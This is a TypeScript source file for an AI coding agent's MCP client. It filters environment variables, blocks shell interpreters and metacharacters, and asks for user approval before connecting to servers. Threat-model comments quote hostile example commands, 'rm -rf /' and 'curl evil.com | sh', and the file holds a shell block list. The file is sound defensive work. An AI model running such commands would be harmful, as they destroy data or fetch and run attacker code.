/**
 * MCP (Model Context Protocol) client.
 *
 * Uses the official @modelcontextprotocol/sdk to connect to MCP servers
 * over both stdio (spawned processes) and HTTP transports.
 *
 * Configuration in `protoagent.jsonc` under `mcp.servers`:
 * {
 *   "servers": {
 *     "my-stdio-server": {
 *       "type": "stdio",
 *       "command": "npx",
 *       "args": ["-y", "@my/mcp-server"],
 *       "env": { "API_KEY": "..." }
 *     },
 *     "my-http-server": {
 *       "type": "http",
 *       "url": "http://localhost:3000/mcp"
 *     }
 *   }
 * }
 *
 * Stdio servers are spawned as child processes communicating over stdin/stdout.
 * HTTP servers connect to a running server via HTTP POST/GET with SSE streaming.
 *
 * SECURITY NOTES:
 * - MCP servers receive LIMITED environment variables (not full process.env)
 * - Commands are validated against shell interpreters and dangerous patterns
 * - All MCP servers require explicit user approval on first connection
 */

import { Client } from '@modelcontextprotocol/sdk/client/index.js';
import { StdioClientTransport } from '@modelcontextprotocol/sdk/client/stdio.js';
import { StreamableHTTPClientTransport } from '@modelcontextprotocol/sdk/client/streamableHttp.js';
import { loadRuntimeConfig, getRuntimeConfig, type RuntimeMcpServerConfig } from './runtime-config.js';
import { logger } from './utils/logger.js';
import { registerDynamicTool, registerDynamicHandler } from './tools/index.js';
import { requestApproval } from './utils/approval.js';

// Security: Allowlist of safe environment variables for MCP servers
// Naive approach: Pass full process.env to MCP servers
// Risk: MCP server can steal API keys, tokens, credentials from environment
// Attack: Malicious MCP server reads OPENAI_API_KEY, ANTHROPIC_API_KEY, etc.
const ALLOWED_MCP_ENV_VARS = [
  'PATH',
  'HOME',
  'USER',
  'LOGNAME',
  'LANG',
  'LC_ALL',
  'LC_CTYPE',
  'LC_MESSAGES',
  'TZ',
  'SHELL',
  'TERM',
  'TMPDIR',
  'NODE_OPTIONS',  // Required for some Node.js MCP servers
];

// Security: Blocked shell interpreters and dangerous commands
// Naive approach: Accept any command
// Risk: Command injection via shell metacharacters
// Attack: "command": "sh -c 'rm -rf /'" or "command": "bash" with malicious args
const BLOCKED_SHELLS = new Set([
  'sh', 'bash', 'zsh', 'fish', 'csh', 'tcsh', 'ksh', 'dash',
  'cmd.exe', 'cmd', 'powershell.exe', 'powershell', 'pwsh', 'pwsh.exe',
]);

// Security: Dangerous patterns in command arguments
const DANGEROUS_ARG_PATTERNS = /[;|&$()`<>]/;

// ─── MCP Server Configuration ───

type StdioServerConfig = Extract<RuntimeMcpServerConfig, { type: 'stdio' }>;
type HttpServerConfig = Extract<RuntimeMcpServerConfig, { type: 'http' }>;

// ─── MCP Server Connection Manager ───

interface McpConnection {
  client: Client;
  serverName: string;
  transport: StdioClientTransport | StreamableHTTPClientTransport;
}

const connections = new Map<string, McpConnection>();

// Track approved MCP servers to prevent re-prompting
const approvedServers = new Set<string>();

/**
 * Security: Validate MCP server command
 * Naive approach: Accept any command string
 * Risk: Command injection, shell escape, arbitrary code execution
 * Attack: "command": "sh", "args": ["-c", "curl evil.com | sh"]
 */
function validateMcpCommand(command: string, args: string[]): { valid: boolean; error?: string } {
  // Check for shell interpreters
  const baseCommand = command.split('/').pop() || command;
  if (BLOCKED_SHELLS.has(baseCommand.toLowerCase())) {
    return {
      valid: false,
      error: `MCP server command "${command}" is a shell interpreter. Shell interpreters are blocked for security.`,
    };
  }

  // Check for absolute path traversal
  if (command.includes('..')) {
    return {
      valid: false,
      error: `MCP server command "${command}" contains path traversal (..).`,
    };
  }

  // Validate arguments don't contain shell metacharacters
  for (const arg of args) {
    if (DANGEROUS_ARG_PATTERNS.test(arg)) {
      return {
        valid: false,
        error: `MCP server argument contains dangerous characters: "${arg.slice(0, 50)}". Shell metacharacters are not allowed.`,
      };
    }
  }

  return { valid: true };
}

/**
 * Security: Filter environment variables for MCP servers
 * Naive approach: Pass all process.env
 * Risk: Credential theft via environment exfiltration
 * Attack: Malicious MCP reads OPENAI_API_KEY, AWS credentials, etc.
 */
function filterMcpEnvironment(
  customEnv?: Record<string, string>
): Record<string, string> {
  const filtered: Record<string, string> = {};

  // Only copy allowed environment variables
  for (const key of ALLOWED_MCP_ENV_VARS) {
    const value = process.env[key];
    if (value !== undefined) {
      filtered[key] = value;
    }
  }

  // Merge in custom env from config (user explicitly set these)
  // These should be reviewed by user during approval
  if (customEnv) {
    for (const [key, value] of Object.entries(customEnv)) {
      filtered[key] = value;
    }
  }

  return filtered;
}

/**
 * Create an MCP client connection for a stdio server.
 */
async function connectStdioServer(
  serverName: string,
  config: StdioServerConfig
): Promise<McpConnection> {
  // Security: Validate command before spawning
  const validation = validateMcpCommand(config.command, config.args || []);
  if (!validation.valid) {
    throw new Error(validation.error);
  }

  // Security: Filter environment variables
  const filteredEnv = filterMcpEnvironment(config.env);

  const transport = new StdioClientTransport({
    command: config.command,
    args: config.args || [],
    env: filteredEnv,
    cwd: config.cwd,
    stderr: 'pipe',
  });

  const client = new Client(
    {
      name: 'protoagent',
      version: '0.0.1',
    },
    {
      capabilities: {},
    }
  );

  await client.connect(transport);

  // Pipe stderr from the spawned process to the logger instead of letting it
  // bleed through to the terminal and corrupt the Ink UI.
  (transport as any).stderr?.on('data', (data: Buffer) => {
    for (const line of data.toString('utf-8').split('\n')) {
      if (line.trim()) logger.debug(`MCP [${serverName}] ${line}`);
    }
  });

  return {
    client,
    serverName,
    transport,
  };
}

/**
 * Create an MCP client connection for an HTTP server.
 */
async function connectHttpServer(
  serverName: string,
  config: HttpServerConfig
): Promise<McpConnection> {
  const transport = new StreamableHTTPClientTransport(new URL(config.url), {
    requestInit: config.headers ? { headers: config.headers } : undefined,
  });

  const client = new Client(
    {
      name: 'protoagent',
      version: '0.0.1',
    },
    {
      capabilities: {},
    }
  );

  await client.connect(transport);

  return {
    client,
    serverName,
    transport,
  };
}

/**
 * Register all tools from an MCP server into the dynamic tool registry.
 */
async function registerMcpTools(conn: McpConnection): Promise<void> {
  try {
    const response = await conn.client.listTools();
    const tools = response.tools || [];

    logger.info(`MCP [${conn.serverName}] discovered ${tools.length} tools`);

    for (const tool of tools) {
      const toolName = `mcp_${conn.serverName}_${tool.name}`;

      registerDynamicTool({
        type: 'function' as const,
        function: {
          name: toolName,
          description: `[MCP: ${conn.serverName}] ${tool.description || tool.name}`,
          parameters: tool.inputSchema as any,
        },
      });

      registerDynamicHandler(toolName, async (args: unknown) => {
        const result = await conn.client.callTool({
          name: tool.name,
          arguments: (args && typeof args === 'object' ? args : {}) as Record<string, unknown>,
        });

        // MCP tool results are arrays of content blocks
        if (Array.isArray(result.content)) {
          return result.content
            .map((c: any) => {
              if (c.type === 'text') return c.text;
              return JSON.stringify(c);
            })
            .join('\n');
        }

        return JSON.stringify(result);
      });
    }
  } catch (err) {
    logger.error(`Failed to register tools for MCP [${conn.serverName}]: ${err}`);
  }
}

/**
 * Load MCP configuration and connect to all configured servers.
 * Registers their tools in the dynamic tool registry.
 */
export async function initializeMcp(): Promise<void> {
  await loadRuntimeConfig();
  const servers = getRuntimeConfig().mcp?.servers || {};

  if (Object.keys(servers).length === 0) return;

  logger.info('Loading MCP servers from merged runtime config');

  for (const [name, serverConfig] of Object.entries(servers)) {
    if (serverConfig.enabled === false) {
      logger.debug(`Skipping disabled MCP server: ${name}`);
      continue;
    }

    // Security: Require user approval for MCP servers
    // Naive approach: Auto-connect to all configured servers
    // Risk: Malicious MCP server in config exfiltrates data or executes code
    // Attack: Attacker modifies protoagent.jsonc to add malicious MCP server
    if (!approvedServers.has(name)) {
      const description = serverConfig.type === 'stdio'
        ? `MCP server "${name}" will execute: ${serverConfig.command} ${(serverConfig.args || []).join(' ')}`
        : `MCP server "${name}" will connect to: ${serverConfig.url}`;

      const approved = await requestApproval({
        id: `mcp-${name}-${Date.now()}`,
        type: 'shell_command',
        description: `Connect to MCP server: ${name}`,
        detail: `${description}\n\nMCP servers can execute arbitrary code and access files. Only connect to servers you trust.`,
        sessionId: undefined,
        sessionScopeKey: `mcp:${name}`,
      });

      if (!approved) {
        logger.warn(`User rejected MCP server: ${name}`);
        continue;
      }

      approvedServers.add(name);
    }

    try {
      let conn: McpConnection;

      if (serverConfig.type === 'stdio') {
        logger.debug(`Connecting to stdio MCP server: ${name}`);
        conn = await connectStdioServer(name, serverConfig);
      } else if (serverConfig.type === 'http') {
        logger.debug(`Connecting to HTTP MCP server: ${name} (${serverConfig.url})`);
        conn = await connectHttpServer(name, serverConfig);
      } else {
        logger.error(`Unknown MCP server type for "${name}": ${(serverConfig as any).type}`);
        continue;
      }

      connections.set(name, conn);
      await registerMcpTools(conn);
    } catch (err) {
      logger.error(`Failed to connect to MCP server "${name}": ${err}`);
    }
  }
}

/**
 * Close all MCP connections.
 */
export async function closeMcp(): Promise<void> {
  for (const [name, conn] of connections) {
    try {
      logger.debug(`Closing MCP connection: ${name}`);
      await conn.client.close();
    } catch (err) {
      logger.error(`Error closing MCP connection [${name}]: ${err}`);
    }
  }
  connections.clear();
}

/**
 * Get the names of all connected MCP servers.
 */
export function getConnectedMcpServers(): string[] {
  return Array.from(connections.keys());
}
